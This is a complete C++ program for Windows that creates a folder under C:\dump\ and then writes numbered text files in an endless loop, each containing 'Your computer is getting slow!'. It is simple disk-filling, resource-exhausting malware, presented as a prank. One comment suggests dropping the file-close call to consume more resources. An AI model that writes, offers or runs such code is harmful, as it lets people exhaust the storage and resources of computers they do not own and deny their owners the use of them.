#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>

int main()
{
    std::size_t i = 0;
    const char *path = "C:\\dump\\";
    std::string content = "Your computer is getting slow!";
    _mkdir(path);
    while (true)
    {
        i++;                                                                               // adds i to itself every time
        std::ofstream file;                                                                // creates a constructor this will save our file
        file.open(path + std::to_string(i) + ".txt", std::ios_base::out);                  // creates a file to a location
        file << content;                                                                   // writes the content in the file and then saves it
        file.close();                                                                      // closes the file // if you want to take more resources don't write this line
        std::cout << "File created: " + std::to_string(i) + "\r\n";  
    }
    return -1;
    

}
